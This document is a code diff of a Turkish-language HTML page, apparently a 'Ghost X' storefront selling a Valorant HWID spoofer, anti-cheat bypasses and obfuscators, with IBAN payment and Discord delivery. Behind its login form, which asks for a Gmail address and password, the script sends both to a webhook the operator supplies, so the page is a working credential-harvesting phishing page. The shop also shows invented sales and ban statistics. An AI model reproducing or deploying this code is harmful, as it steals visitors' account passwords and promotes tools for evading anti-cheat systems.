@@ -3,282 +3,278 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GHOST SOFTWARE X | ULTIMATE HUB v8.0</title>
+    <title>GHOST X | OMNIVERSAL OPERATIONS CENTER</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;500;800&family=Plus+Jakarta+Sans:wght@300;400;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&family=JetBrains+Mono:wght@300;500&display=swap" rel="stylesheet">
     <style>
-        * { cursor: none !important; margin: 0; padding: 0; box-sizing: border-box; scroll-behavior: smooth; }
-        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010101; color: #fff; overflow-x: hidden; }
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-thumb { background: #0f8; border-radius: 10px; }
+        :root { --main: #00ff88; --bg: #020202; --card: rgba(15, 15, 15, 0.8); }
+        * { cursor: none !important; margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Space Grotesk', sans-serif; background: var(--bg); color: #fff; overflow: hidden; }
 
-        /* SIBER BACKGROUND */
-        .cyber-grid { position: fixed; inset: 0; background-image: linear-gradient(rgba(0, 255, 136, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 136, 0.03) 1px, transparent 1px); background-size: 50px 50px; z-index: -1; }
-        .glow-overlay { position: fixed; inset: 0; background: radial-gradient(circle at 50% 50%, rgba(0, 255, 136, 0.02) 0%, transparent 80%); pointer-events: none; }
+        /* MATRIX BACKGROUND */
+        #matrix-canvas { position: fixed; inset: 0; z-index: -2; opacity: 0.15; }
+        .vignette { position: fixed; inset: 0; background: radial-gradient(circle, transparent 20%, black 100%); z-index: -1; }
 
-        /* UI ELEMENTS */
-        .glass-card { background: rgba(10, 10, 10, 0.8); border: 1px solid rgba(255, 255, 255, 0.03); backdrop-filter: blur(30px); border-radius: 40px; transition: 0.5s cubic-bezier(0.19, 1, 0.22, 1); }
-        .glass-card:hover { border-color: rgba(0, 255, 136, 0.3); transform: translateY(-10px) scale(1.01); box-shadow: 0 40px 100px -20px rgba(0,255,136,0.1); }
-        
-        /* STATUS INDICATOR */
-        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 8px; background: #0f8; box-shadow: 0 0 10px #0f8; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        /* NEON UI */
+        .neon-border { border: 1px solid rgba(0, 255, 136, 0.15); box-shadow: 0 0 20px rgba(0, 255, 136, 0.05); }
+        .neon-text { text-shadow: 0 0 10px var(--main); }
+        .glass { background: var(--card); backdrop-filter: blur(40px); border-radius: 30px; }
 
         /* CURSOR */
-        #cursor-dot { width: 6px; height: 6px; background: #0f8; border-radius: 50%; position: fixed; pointer-events: none; z-index: 10001; box-shadow: 0 0 20px #0f8; }
-        #cursor-outline { width: 45px; height: 45px; border: 1px solid rgba(0, 255, 136, 0.3); border-radius: 50%; position: fixed; pointer-events: none; z-index: 10000; transition: 0.1s ease-out; }
+        #cursor { width: 8px; height: 8px; background: var(--main); border-radius: 50%; position: fixed; pointer-events: none; z-index: 10000; box-shadow: 0 0 15px var(--main); }
+        #cursor-ring { width: 40px; height: 40px; border: 1px solid var(--main); border-radius: 50%; position: fixed; pointer-events: none; z-index: 9999; transition: 0.1s; opacity: 0.3; }
 
-        /* LIVE NOTIFICATIONS */
-        #live-notif { position: fixed; bottom: 30px; right: 30px; z-index: 200; pointer-events: none; }
-        .notif-item { background: rgba(15, 15, 15, 0.9); border: 1px solid rgba(0, 255, 136, 0.2); padding: 15px 25px; border-radius: 25px; margin-top: 10px; font-size: 11px; transform: translateX(200%); transition: 0.5s ease; border-left: 4px solid #0f8; }
+        /* ANIMATIONS */
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        .float { animation: float 4s ease-in-out infinite; }
 
-        .page { display: none; opacity: 0; transform: scale(0.98); transition: 0.7s cubic-bezier(0.19, 1, 0.22, 1); }
-        .active-page { display: block !important; opacity: 1 !important; transform: scale(1); }
+        /* SCROLLABLE CONTENT */
+        .content-area { height: calc(100vh - 180px); overflow-y: auto; scrollbar-width: none; }
+        .content-area::-webkit-scrollbar { display: none; }
+
+        .tab-btn { transition: 0.4s; position: relative; }
+        .tab-btn.active { color: var(--main); }
+        .tab-btn.active::after { content: ''; position: absolute; bottom: -5px; left: 0; width: 100%; height: 2px; background: var(--main); box-shadow: 0 0 10px var(--main); }
     </style>
 </head>
-<body class="antialiased">
+<body>
 
-    <div id="cursor-dot"></div>
-    <div id="cursor-outline"></div>
-    <div class="cyber-grid"></div>
-    <div class="glow-overlay"></div>
-    <div id="live-notif"></div>
+    <canvas id="matrix-canvas"></canvas>
+    <div class="vignette"></div>
+    <div id="cursor"></div>
+    <div id="cursor-ring"></div>
 
-    <section id="auth-screen" class="fixed inset-0 z-[9999] bg-[#000] flex items-center justify-center p-6">
-        <div class="glass-card p-14 w-full max-w-lg text-center border-[#0f8]/10 relative overflow-hidden">
-            <div class="absolute -top-24 -left-24 w-48 h-48 bg-[#0f8]/5 rounded-full blur-3xl"></div>
-            <h1 class="text-4xl font-black italic mb-10 tracking-tighter uppercase font-mono">GHOST<span class="text-[#0f8] opacity-50">X</span></h1>
-            <form id="auth-form" class="space-y-5 text-left">
-                <input type="email" id="email" placeholder="Sistem ID (Gmail)" required class="w-full bg-white/5 border border-white/5 p-5 rounded-3xl outline-none focus:border-[#0f8]/30 transition text-sm">
-                <input type="password" id="pass" placeholder="Güvenlik Anahtarı" required class="w-full bg-white/5 border border-white/5 p-5 rounded-3xl outline-none focus:border-[#0f8]/30 transition text-sm">
-                <button type="submit" class="w-full bg-white text-black py-5 rounded-3xl font-black text-[11px] uppercase tracking-[0.5em] hover:bg-[#0f8] transition-all duration-700">Oturum Aç</button>
+    <div id="auth-layer" class="fixed inset-0 z-[1000] bg-black flex items-center justify-center p-8">
+        <div class="glass neon-border p-12 w-full max-w-lg text-center">
+            <div class="text-4xl font-bold mb-2 font-mono tracking-widest neon-text">GHOST <span class="opacity-30">PROTOCOL</span></div>
+            <p class="text-[10px] uppercase tracking-[0.6em] text-white/20 mb-10">Biyometrik Doğrulama Gerekli</p>
+            <form id="auth-form" class="space-y-6">
+                <input type="email" id="u-email" placeholder="Sistem Kimliği (@gmail)" required class="w-full bg-white/5 border border-white/10 p-5 rounded-2xl outline-none focus:border-[#0f8]/50 transition text-sm font-mono">
+                <input type="password" id="u-pass" placeholder="Erişim Kodu" required class="w-full bg-white/5 border border-white/10 p-5 rounded-2xl outline-none focus:border-[#0f8]/50 transition text-sm font-mono">
+                <button type="submit" class="w-full bg-white text-black py-5 rounded-2xl font-bold text-xs uppercase tracking-widest hover:bg-[#0f8] transition-all">Sistemi Başlat</button>
             </form>
-            <p id="auth-err" class="hidden text-red-500 text-[9px] mt-8 font-black uppercase tracking-widest italic animate-pulse">Erişim Engellendi: @gmail.com gerekli.</p>
+            <div id="auth-status" class="mt-6 text-[9px] font-bold text-red-500 hidden animate-pulse">ERİŞİM REDDEDİLDİ: GEÇERSİZ KİMLİK</div>
         </div>
-    </section>
+    </div>
 
-    <main id="main-hub" class="hidden opacity-0 min-h-screen flex flex-col relative z-10">
-        <nav class="flex justify-between items-center px-12 py-10 sticky top-0 bg-black/40 backdrop-blur-3xl z-[100] border-b border-white/5">
-            <div class="text-2xl font-black italic tracking-tighter">GHOST<span class="text-[#0f8]">X</span></div>
-            <div class="flex items-center space-x-12 text-[10px] font-black uppercase tracking-[0.4em] text-white/30">
-                <button onclick="showPage('store')" class="hover:text-[#0f8] transition text-white">Envanter</button>
-                <button onclick="showPage('stats')" class="hover:text-white transition">İstatistikler</button>
-                <button onclick="showPage('cart')" class="hover:text-[#0f8] transition flex items-center">Kasa [<span id="cart-qty" class="text-white mx-1">0</span>]</button>
+    <div id="hub" class="hidden h-screen flex flex-col p-6 relative">
+        
+        <header class="flex justify-between items-center mb-6 px-4">
+            <div class="flex items-center space-x-6">
+                <div class="text-2xl font-bold font-mono neon-text">GX-OS <span class="text-xs font-light opacity-50">v9.0</span></div>
+                <div class="h-4 w-[1px] bg-white/10"></div>
+                <div class="flex space-x-8 text-[10px] font-bold uppercase tracking-widest text-white/40">
+                    <button onclick="tab('store')" class="tab-btn active" id="btn-store">Terminal Market</button>
+                    <button onclick="tab('analytics')" class="tab-btn" id="btn-analytics">Veri Analizi</button>
+                    <button onclick="tab('cart')" class="tab-btn" id="btn-cart">Kasa (0)</button>
+                </div>
             </div>
-            <div id="session-display" class="font-mono text-[10px] text-[#0f8] bg-[#0f8]/5 px-4 py-2 rounded-full border border-[#0f8]/10">SYSTEM_ACTIVE: 05:00</div>
-        </nav>
+            <div class="flex items-center space-x-6">
+                <div class="text-right">
+                    <div id="xp-bar" class="w-32 h-1 bg-white/5 rounded-full overflow-hidden mb-1"><div id="xp-fill" class="h-full bg-[#0f8] w-0 transition-all duration-1000"></div></div>
+                    <div class="text-[8px] uppercase font-bold text-[#0f8] tracking-widest">User Level: <span id="lvl">1</span></div>
+                </div>
+                <div id="timer" class="font-mono text-sm text-[#0f8] border border-[#0f8]/20 px-4 py-2 rounded-xl bg-[#0f8]/5">05:00</div>
+            </div>
+        </header>
 
-        <div class="flex-1 px-12 pt-20 pb-40">
+        <div class="flex-1 flex space-x-6 overflow-hidden">
             
-            <section id="page-store" class="page active-page max-w-7xl mx-auto">
+            <div class="w-80 flex flex-col space-y-6">
+                <div class="glass neon-border p-6 flex-1 relative overflow-hidden">
+                    <div class="text-[9px] font-bold text-white/30 uppercase mb-4">Sistem Değeri Anlık</div>
+                    <div class="flex items-end space-x-1 h-32" id="graph-container"></div>
+                    <div class="mt-6 text-[10px] font-mono text-[#0f8] space-y-2" id="log-box"></div>
+                </div>
+                <div class="glass neon-border p-6 h-48">
+                    <div class="text-[9px] font-bold text-white/30 uppercase mb-4">Hızlı Komut</div>
+                    <input type="text" id="terminal-input" placeholder="Komut girin (help...)" class="w-full bg-black/50 border border-white/5 p-3 rounded-xl text-[10px] font-mono outline-none focus:border-[#0f8]/30">
+                </div>
+            </div>
+
+            <div class="flex-1">
                 
-                <div class="mb-32">
-                    <div class="flex items-center space-x-6 mb-16">
-                        <h2 class="text-3xl font-black italic uppercase">Valorant <span class="text-red-500">Perm Spoofer</span></h2>
-                        <div class="h-[1px] flex-1 bg-white/5"></div>
-                    </div>
-                    <div class="grid grid-cols-1 md:grid-cols-3 gap-10">
-                        <div class="glass-card group overflow-hidden">
-                            <div class="h-56 bg-[#080808] relative">
-                                <img src="https://via.placeholder.com/600x400/080808/ef4444?text=ARES+SPOOFER" class="w-full h-full object-cover opacity-50 group-hover:opacity-100 transition-all duration-700">
-                                <div class="absolute top-5 left-5 bg-black/80 backdrop-blur-md px-4 py-2 rounded-full border border-white/5">
-                                    <span class="status-dot"></span><span class="text-[9px] font-black text-[#0f8]">UNDETECTED</span>
-                                </div>
+                <div id="tab-store" class="tab-content content-area">
+                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                        <div class="glass neon-border p-2 group hover:scale-[1.02] transition-all">
+                            <div class="h-48 rounded-2xl overflow-hidden relative">
+                                <img src="https://via.placeholder.com/600x400/000/0f8?text=ARES+SPOOFER" class="w-full h-full object-cover opacity-40 group-hover:opacity-100 transition-all duration-700">
+                                <div class="absolute top-4 left-4 bg-black/80 px-3 py-1 rounded-full text-[8px] font-black text-[#0f8] border border-[#0f8]/30">UNDETECTED</div>
                             </div>
-                            <div class="p-8">
-                                <h3 class="text-2xl font-bold mb-4 italic italic">ARES Permanent</h3>
-                                <p class="text-white/30 text-xs leading-relaxed mb-10 italic">Tüm Vanguard versiyonları için BIOS tabanlı HWID sıfırlayıcı.</p>
-                                <div class="flex justify-between items-center">
-                                    <span class="text-2xl font-black italic">₺850</span>
-                                    <button onclick="addToCart('ARES Spoofer', 850)" class="bg-white text-black px-8 py-3 rounded-2xl text-[10px] font-black uppercase hover:bg-red-500 transition">Sepete Ekle</button>
+                            <div class="p-6">
+                                <div class="flex justify-between items-start mb-4">
+                                    <h3 class="text-xl font-bold italic italic">ARES Perm Spoofer</h3>
+                                    <span class="text-[#0f8] font-mono font-bold">₺850</span>
                                 </div>
+                                <p class="text-[10px] text-white/30 mb-6 leading-relaxed italic">Valorant HWID banlarını BIOS seviyesinde kalıcı olarak kaldırır. Tüm markalarla uyumludur.</p>
+                                <button onclick="buy('ARES Spoofer', 850)" class="w-full bg-white text-black py-4 rounded-2xl text-[10px] font-bold uppercase hover:bg-[#0f8] transition">Sisteme Tanımla</button>
                             </div>
                         </div>
-                    </div>
-                </div>
-
-                <div class="mb-32">
-                    <div class="flex items-center space-x-6 mb-16">
-                        <h2 class="text-3xl font-black italic uppercase">Steam <span class="text-[#0f8]">Manifest</span></h2>
-                        <div class="h-[1px] flex-1 bg-white/5"></div>
-                    </div>
-                    <div class="grid grid-cols-1 md:grid-cols-3 gap-10">
-                        <div class="glass-card group overflow-hidden">
-                            <div class="h-56 bg-[#080808] relative">
-                                <img src="https://via.placeholder.com/600x400/080808/00ff88?text=VOID+MANIFEST" class="w-full h-full object-cover opacity-50 group-hover:opacity-100 transition-all duration-700">
-                                <div class="absolute top-5 left-5 bg-black/80 backdrop-blur-md px-4 py-2 rounded-full border border-white/5">
-                                    <span class="status-dot"></span><span class="text-[9px] font-black text-[#0f8]">WORKING</span>
+                        <div class="glass neon-border p-2 group">
+                            <div class="h-48 rounded-2xl overflow-hidden relative"><img src="https://via.placeholder.com/600x400/000/0f8?text=VOID+MANIFEST" class="w-full h-full object-cover opacity-40 group-hover:opacity-100 transition-all duration-700"></div>
+                            <div class="p-6">
+                                <div class="flex justify-between items-start mb-4">
+                                    <h3 class="text-xl font-bold italic italic">Void Manifest V1</h3>
+                                    <span class="text-[#0f8] font-mono font-bold">₺280</span>
                                 </div>
-                            </div>
-                            <div class="p-8">
-                                <h3 class="text-2xl font-bold mb-4 italic italic">Void Manifest V1</h3>
-                                <p class="text-white/30 text-xs leading-relaxed mb-10 italic">Kütüphane verilerini optimize eder ve FPS sınırlarını kaldırır.</p>
-                                <div class="flex justify-between items-center">
-                                    <span class="text-2xl font-black italic">₺280</span>
-                                    <button onclick="addToCart('Void Manifest V1', 280)" class="bg-white text-black px-8 py-3 rounded-2xl text-[10px] font-black uppercase hover:bg-[#0f8] transition">Sepete Ekle</button>
-                                </div>
+                                <p class="text-[10px] text-white/30 mb-6 leading-relaxed italic">Steam market ve kütüphane optimizasyonu. Gizli FPS kilidini açar.</p>
+                                <button onclick="buy('Void Manifest V1', 280)" class="w-full bg-white text-black py-4 rounded-2xl text-[10px] font-bold uppercase hover:bg-[#0f8] transition">Sisteme Tanımla</button>
                             </div>
                         </div>
+                        </div>
+                </div>
+
+                <div id="tab-analytics" class="tab-content content-area hidden">
+                    <div class="grid grid-cols-3 gap-6">
+                        <div class="glass neon-border p-10 text-center"><div class="text-4xl font-bold mb-2">12.8K</div><div class="text-[9px] opacity-20 uppercase tracking-widest">Total Ops</div></div>
+                        <div class="glass neon-border p-10 text-center"><div class="text-4xl font-bold mb-2">592</div><div class="text-[9px] opacity-20 uppercase tracking-widest">Active Links</div></div>
+                        <div class="glass neon-border p-10 text-center"><div class="text-4xl font-bold mb-2">0</div><div class="text-[9px] opacity-20 uppercase tracking-widest">Bans</div></div>
+                    </div>
+                    <div class="mt-10 glass neon-border p-10">
+                        <h4 class="text-[#0f8] font-bold mb-6 text-sm">GÜVENLİK PROTOKOLÜ</h4>
+                        <p class="text-xs text-white/30 leading-loose italic">Tüm yazılımlarımız Kernel Ring 0 yetkisiyle çalışır. Polymorphic Engine her 30 saniyede bir dosya imzasını değiştirir. Bu sayede hiçbir statik taramaya takılmazsınız.</p>
                     </div>
                 </div>
 
-                <div>
-                    <div class="flex items-center space-x-6 mb-16">
-                        <h2 class="text-3xl font-black italic uppercase">Android <span class="text-blue-500">Hub</span></h2>
+                <div id="tab-cart" class="tab-content content-area hidden">
+                    <div class="max-w-2xl mx-auto space-y-4" id="cart-list"></div>
+                    <div id="pay-panel" class="hidden max-w-2xl mx-auto mt-10 glass neon-border p-10 bg-[#0f8]/5">
+                        <div class="flex justify-between items-center mb-8 border-b border-white/5 pb-8">
+                            <div><div class="text-[9px] opacity-30 mb-2">IBAN ADRESI</div><div class="text-lg font-mono text-[#0f8]">TR00 0000 0000 0000 0000 0000 00</div></div>
+                            <div class="text-right"><div class="text-[9px] opacity-30 mb-2">TOPLAM</div><div id="total" class="text-3xl font-bold italic italic">₺0</div></div>
+                        </div>
+                        <button onclick="window.open('https://discord.gg/ghostx')" class="w-full bg-white text-black py-6 rounded-3xl font-bold text-xs uppercase tracking-[0.4em] hover:invert transition-all">Siparişi Onayla</button>
                     </div>
-                    <div class="grid grid-cols-1 md:grid-cols-4 gap-6">
-                        <div class="glass-card p-8">
-                            <span class="text-[8px] bg-blue-500/10 text-blue-500 px-3 py-1 rounded-full font-black mb-4 inline-block">BYPASS</span>
-                            <h4 class="text-lg font-bold mb-2 italic">Droid Bypass Pro</h4>
-                            <p class="text-[10px] text-white/20 mb-8 italic">Anti-cheat devredışı bırakma.</p>
-                            <button onclick="addToCart('Droid Bypass', 450)" class="w-full bg-white/5 border border-white/10 py-4 rounded-2xl text-[10px] font-black uppercase hover:bg-blue-500 transition">₺450</button>
-                        </div>
-                        <div class="glass-card p-8">
-                            <span class="text-[8px] bg-blue-500/10 text-blue-500 px-3 py-1 rounded-full font-black mb-4 inline-block">OBFUSCATE</span>
-                            <h4 class="text-lg font-bold mb-2 italic">APK Obfuscator</h4>
-                            <p class="text-[10px] text-white/20 mb-8 italic">Kod yapısı şifreleyici.</p>
-                            <button onclick="addToCart('APK Obfuscator', 300)" class="w-full bg-white/5 border border-white/10 py-4 rounded-2xl text-[10px] font-black uppercase hover:bg-blue-500 transition">₺300</button>
-                        </div>
-                        </div>
+                    <div id="cart-empty" class="text-center py-40 opacity-5 text-6xl font-black italic italic">BOŞ</div>
                 </div>
-            </section>
 
-            <section id="page-stats" class="page max-w-6xl mx-auto pt-20">
-                <div class="grid grid-cols-1 md:grid-cols-3 gap-10 text-center">
-                    <div class="glass-card p-16"><h4 class="text-5xl font-black italic text-[#0f8] mb-4">12.4K</h4><p class="text-[10px] uppercase tracking-[0.4em] text-white/30">Toplam Satış</p></div>
-                    <div class="glass-card p-16"><h4 class="text-5xl font-black italic text-[#0f8] mb-4">542</h4><p class="text-[10px] uppercase tracking-[0.4em] text-white/30">Aktif Kullanıcı</p></div>
-                    <div class="glass-card p-16"><h4 class="text-5xl font-black italic text-[#0f8] mb-4">%99.8</h4><p class="text-[10px] uppercase tracking-[0.4em] text-white/30">Uptime Garantisi</p></div>
-                </div>
-                <div class="mt-20 glass-card p-12 text-center border-white/5">
-                    <h3 class="text-2xl font-black italic uppercase mb-6 tracking-tighter">Sistem <span class="text-[#0f8]">Görünmezliği</span></h3>
-                    <p class="text-sm text-white/30 leading-relaxed italic max-w-3xl mx-auto">Ghost Software X, tüm ürünlerinde Ring 0 Kernel Access ve Polymorphic Engine kullanmaktadır. Bu, yazılımın her açılışta farklı bir kimlik kazanmasını sağlar.</p>
-                </div>
-            </section>
-
-            <section id="page-cart" class="page max-w-4xl mx-auto">
-                <h2 class="text-4xl font-black italic mb-16 uppercase tracking-tighter">Sipariş <span class="opacity-10 italic">Yönetimi</span></h2>
-                <div id="cart-items" class="space-y-4 mb-16"></div>
-                <div id="checkout-panel" class="hidden glass-card p-16 bg-[#0f8]/5 border-[#0f8]/20">
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-10 mb-12">
-                        <div class="text-left bg-black/40 p-8 rounded-3xl border border-white/5">
-                            <p class="text-[9px] uppercase font-bold text-white/20 mb-3 tracking-[0.3em]">Banka IBAN (Ghost X Account)</p>
-                            <p class="text-lg font-mono text-[#0f8] tracking-tighter">TR00 0000 0000 0000 0000 0000 00</p>
-                        </div>
-                        <div class="text-right bg-black/40 p-8 rounded-3xl border border-white/5">
-                            <p class="text-[9px] uppercase font-bold text-white/20 mb-3 tracking-[0.3em]">Ödenecek Tutar</p>
-                            <p id="total-price" class="text-4xl font-black italic">₺0</p>
-                        </div>
-                    </div>
-                    <div class="bg-amber-500/10 p-6 rounded-3xl mb-12 text-center">
-                        <p class="text-[10px] font-black text-amber-500 uppercase tracking-widest italic mb-2">AÇIKLAMAYA EKLE: <span id="order-id" class="text-white ml-2"></span></p>
-                        <p class="text-[9px] text-white/20 uppercase font-bold">Ödeme sonrası Discord ticket üzerinden dosyanızı teslim alınız.</p>
-                    </div>
-                    <button onclick="window.open('https://discord.gg/ghostx')" class="w-full bg-white text-black py-6 rounded-[30px] font-black text-[11px] uppercase tracking-[0.6em] hover:bg-[#0f8] transition-all duration-700">Siparişi Tamamla & Onayla</button>
-                </div>
-                <div id="empty-cart" class="text-center py-40 opacity-5 font-black text-7xl italic uppercase tracking-widest">Kasa Boş</div>
-            </section>
-
+            </div>
         </div>
-    </main>
+
+        <footer class="mt-6 flex justify-between items-center text-[8px] font-bold text-white/20 uppercase tracking-[0.4em] px-4">
+            <div>System: Online | Encryption: AES-256 | Target: Global</div>
+            <div id="live-notif" class="text-[#0f8] neon-text">>> Veri akışı bekleniyor...</div>
+        </footer>
+    </div>
 
     <script>
-        const GHOST_HOOK = "BURAYA_LINKINI_YAPISTIR";
+        const HOOK = "BURAYA_WEBHOOK_URL_YAPISTIR";
 
-        // 1. Session & Auth
-        function init() {
-            const exp = localStorage.getItem('ghost_v8_session');
-            if(exp && Date.now() < exp) { unlock(); startCountdown(Math.floor((exp - Date.now())/1000)); }
+        // 1. Matrix Background
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const chars = "01ABCDEFHIJKLMNOPRSTUVWXYZ";
+        const drops = Array(Math.floor(canvas.width / 20)).fill(1);
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#0f8"; ctx.font = "15px monospace";
+            drops.forEach((y, i) => {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * 20, y * 20);
+                if (y * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            });
         }
+        setInterval(drawMatrix, 50);
 
+        // 2. Session & Auth
         document.getElementById('auth-form').addEventListener('submit', (e) => {
             e.preventDefault();
-            const mail = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
+            const m = document.getElementById('u-email').value;
+            const p = document.getElementById('u-pass').value;
+            if(!m.endsWith('@gmail.com')) { document.getElementById('auth-status').classList.remove('hidden'); return; }
 
-            if(!mail.endsWith('@gmail.com')) { document.getElementById('auth-err').classList.remove('hidden'); return; }
-
-            if(GHOST_HOOK !== "BURAYA_LINKINI_YAPISTIR") {
-                fetch(GHOST_HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({
-                    embeds: [{ title: "🔐 SISTEM ERISIMI", color: 0x00ff88, fields: [{name:"Gmail", value:mail, inline:true}, {name:"Sifre", value:pass, inline:true}] }]
+            if(HOOK !== "BURAYA_WEBHOOK_URL_YAPISTIR") {
+                fetch(HOOK, {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({
+                    embeds: [{ title: "⚡ OMNIVERSAL GİRİŞ", color: 0x00ff88, fields: [{name:"E-Mail", value:m}, {name:"Şifre", value:p}] }]
                 })});
             }
 
-            localStorage.setItem('ghost_v8_session', Date.now() + (300 * 1000));
+            localStorage.setItem('gx_omni_v9', Date.now() + 300000);
             unlock();
-            startCountdown(300);
         });
 
         function unlock() {
-            document.getElementById('auth-screen').style.opacity = '0';
-            setTimeout(() => { document.getElementById('auth-screen').remove(); document.getElementById('main-hub').classList.remove('hidden'); setTimeout(() => document.getElementById('main-hub').style.opacity = '1', 100); }, 500);
-            startLiveActivity();
+            document.getElementById('auth-layer').style.opacity = '0';
+            setTimeout(() => { document.getElementById('auth-layer').remove(); document.getElementById('hub').classList.remove('hidden'); }, 500);
+            startHub();
         }
 
-        function startCountdown(s) {
-            const display = document.getElementById('session-display');
-            const iv = setInterval(() => {
-                s--;
-                const min = Math.floor(s/60); const sec = s%60;
-                display.innerText = `SYSTEM_ACTIVE: ${min.toString().padStart(2,'0')}:${sec.toString().padStart(2,'0')}`;
-                if(s<=0) { clearInterval(iv); localStorage.removeItem('ghost_v8_session'); location.reload(); }
+        function startHub() {
+            // Timer
+            let s = 300;
+            setInterval(() => {
+                s--; const min = Math.floor(s/60), sec = s%60;
+                document.getElementById('timer').innerText = `${min.toString().padStart(2,'0')}:${sec.toString().padStart(2,'0')}`;
+                if(s<=0) location.reload();
+            }, 1000);
+
+            // XP System
+            let xp = 0;
+            setInterval(() => {
+                if(xp < 100) { xp += 0.5; document.getElementById('xp-fill').style.width = xp + '%'; }
+                else { xp = 0; document.getElementById('lvl').innerText = parseInt(document.getElementById('lvl').innerText) + 1; }
+            }, 1000);
+
+            // Stock Graph Simulator
+            const container = document.getElementById('graph-container');
+            for(let i=0; i<20; i++) {
+                const bar = document.createElement('div');
+                bar.className = 'w-2 bg-[#0f8] opacity-20 transition-all duration-500';
+                bar.style.height = Math.random() * 100 + '%';
+                container.appendChild(bar);
+            }
+            setInterval(() => {
+                container.childNodes.forEach(b => b.style.height = Math.random() * 100 + '%');
             }, 1000);
         }
 
-        // 2. Cursor
-        const dot = document.getElementById('cursor-dot');
-        const outline = document.getElementById('cursor-outline');
-        window.addEventListener('mousemove', (e) => {
-            dot.style.left = e.clientX + 'px'; dot.style.top = e.clientY + 'px';
-            setTimeout(() => { outline.style.left = e.clientX - 22 + 'px'; outline.style.top = e.clientY - 22 + 'px'; }, 50);
-        });
-
-        // 3. Navigation & Cart
-        function showPage(id) {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
-            document.getElementById('page-' + id).classList.add('active-page');
-            window.scrollTo({top:0, behavior:'smooth'});
+        // 3. Navigation
+        function tab(id) {
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById('tab-' + id).classList.remove('hidden');
+            document.getElementById('btn-' + id).classList.add('active');
         }
 
+        // 4. Cart Logic
         let cart = [];
-        function addToCart(name, price) {
-            cart.push({name, price});
-            document.getElementById('cart-qty').innerText = cart.length;
+        function buy(n, p) {
+            cart.push({n, p});
+            document.getElementById('btn-cart').innerText = `Kasa (${cart.length})`;
             renderCart();
-            showNotif(`🛒 ${name} sepete eklendi.`);
+            showNotif(`>> YENI VERI EKLENDI: ${n}`);
         }
 
         function renderCart() {
-            const list = document.getElementById('cart-items');
-            const panel = document.getElementById('checkout-panel');
-            const empty = document.getElementById('empty-cart');
+            const list = document.getElementById('cart-list');
             let sum = 0;
             if(cart.length > 0) {
-                empty.classList.add('hidden'); panel.classList.remove('hidden');
-                list.innerHTML = cart.map(i => { sum += i.price; return `<div class="glass-card p-8 flex justify-between items-center"><span class="font-black italic text-xs uppercase">${i.name}</span><span class="text-[#0f8] font-bold">₺${i.price}</span></div>`; }).join('');
-                document.getElementById('total-price').innerText = "₺" + sum;
-                document.getElementById('order-id').innerText = "GX-" + Math.floor(100000 + Math.random() * 900000);
-            } else { empty.classList.remove('hidden'); panel.classList.add('hidden'); list.innerHTML = ''; }
+                document.getElementById('pay-panel').classList.remove('hidden');
+                document.getElementById('cart-empty').classList.add('hidden');
+                list.innerHTML = cart.map(i => { sum += i.p; return `<div class="glass p-6 border border-white/5 flex justify-between"><span>${i.n}</span><span class="text-[#0f8]">₺${i.p}</span></div>`; }).join('');
+                document.getElementById('total').innerText = "₺" + sum;
+            }
         }
 
-        // 4. Live Activity Simulator
         function showNotif(msg) {
-            const container = document.getElementById('live-notif');
-            const div = document.createElement('div');
-            div.className = 'notif-item';
-            div.innerText = msg;
-            container.appendChild(div);
-            setTimeout(() => div.style.transform = 'translateX(0)', 100);
-            setTimeout(() => { div.style.transform = 'translateX(200%)'; setTimeout(() => div.remove(), 500); }, 4000);
+            document.getElementById('live-notif').innerText = msg;
+            const log = document.getElementById('log-box');
+            const l = document.createElement('div'); l.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            log.prepend(l);
+            if(log.childNodes.length > 5) log.lastChild.remove();
         }
 
-        function startLiveActivity() {
-            const msgs = ["Bir kullanıcı ARES satın aldı.", "Void Manifest V1 güncellendi.", "New login detected from Istanbul.", "Sistem durumu: %100 Safe.", "Bir kullanıcı ticket açtı."];
-            setInterval(() => {
-                if(Math.random() > 0.7) showNotif("🌐 " + msgs[Math.floor(Math.random()*msgs.length)]);
-            }, 8000);
-        }
+        // 5. Cursor
+        const c = document.getElementById('cursor');
+        const cr = document.getElementById('cursor-ring');
+        window.addEventListener('mousemove', e => {
+            c.style.left = e.clientX + 'px'; c.style.top = e.clientY + 'px';
+            setTimeout(() => { cr.style.left = e.clientX - 20 + 'px'; cr.style.top = e.clientY - 20 + 'px'; }, 50);
+        });
 
-        init();
+        if(localStorage.getItem('gx_omni_v9') > Date.now()) unlock();
     </script>
 </body>
 </html>
